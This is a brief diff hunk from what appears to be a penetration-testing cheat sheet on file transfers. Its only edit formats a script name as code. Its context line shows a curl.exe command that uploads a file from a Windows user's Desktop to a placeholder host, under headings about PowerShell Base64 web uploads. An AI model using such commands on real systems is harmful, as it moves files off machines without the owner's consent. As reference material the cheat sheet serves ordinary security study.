@@ -212,7 +212,7 @@ curl.exe -X POST http://<IP>:<PORT>/upload -F "files=@C:\Users\Cartman\Desktop\F
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Base64 Web Upload</h4></summary>  
 
-Script needed: [linux_file_receiver.py](../scripts/file_transfers/linux_file_receiver.py)
+Script needed: [`linux_file_receiver.py`](../scripts/file_transfers/linux_file_receiver.py)
 
 **Destination Machine (Linux): Destination Machine (Linux): Start Web Server**
 
